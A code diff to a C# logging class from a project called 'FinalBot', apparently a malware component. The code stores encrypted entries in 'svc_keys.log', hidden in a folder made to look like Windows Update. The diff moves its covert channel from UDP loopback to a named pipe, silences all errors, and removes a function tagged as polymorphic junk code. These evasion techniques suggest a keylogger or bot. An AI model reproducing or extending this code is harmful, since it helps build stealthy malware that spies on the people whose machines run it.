@@ -1,22 +1,14 @@
 using System;
 using System.IO;
-using System.Net;
-using System.Net.Sockets;
 using System.Text;
+using System.IO.Pipes;
 
 namespace FinalBot
 {
     public static class Logger
     {
-        // [POLY_JUNK]
-        private static void _vanguard_b41dcc57() {
-            int val = 91928;
-            if (val > 50000) Console.WriteLine("Hash:" + 91928);
-        }
-
         private static readonly string LogFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update", "svc_keys.log");
         private static readonly object _lock = new object();
-        private const int UdpPort = 51337;
         private static readonly string Salt = "n2xkNQYbZwj8r9fz";
 
         public static void Log(string message, string level = "INFO")
@@ -28,25 +20,19 @@ namespace FinalBot
                     string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                     string logEntry = $"[{timestamp}] [{level}] {message}";
                     
-                    // Console output for debugging
                     ConfigureConsoleColor(level);
                     Console.WriteLine(logEntry);
                     Console.ResetColor();
 
-                    // File logging
-                    File.AppendAllText(LogFile, logEntry + Environment.NewLine);
+                    try { File.AppendAllText(LogFile, logEntry + Environment.NewLine); } catch { }
 
-                    // UDP Forwarding (Encrypted)
-                    SendToUdp(logEntry);
+                    SendToPipe(logEntry);
                 }
             }
-            catch
-            {
-                // Never fail due to logging
-            }
+            catch { }
         }
 
-        private static void SendToUdp(string message)
+        private static void SendToPipe(string message)
         {
             try
             {
@@ -60,11 +46,15 @@ namespace FinalBot
                 }
 
                 string base64 = Convert.ToBase64String(encrypted);
-                byte[] payload = Encoding.UTF8.GetBytes(base64);
 
-                using (var client = new UdpClient())
+                using (var pipeClient = new NamedPipeClientStream(".", "vanguard_status_pipe", PipeDirection.Out))
                 {
-                    client.Send(payload, payload.Length, new IPEndPoint(IPAddress.Loopback, UdpPort));
+                    pipeClient.Connect(200);
+                    using (var writer = new StreamWriter(pipeClient))
+                    {
+                        writer.Write(base64);
+                        writer.Flush();
+                    }
                 }
             }
             catch { }
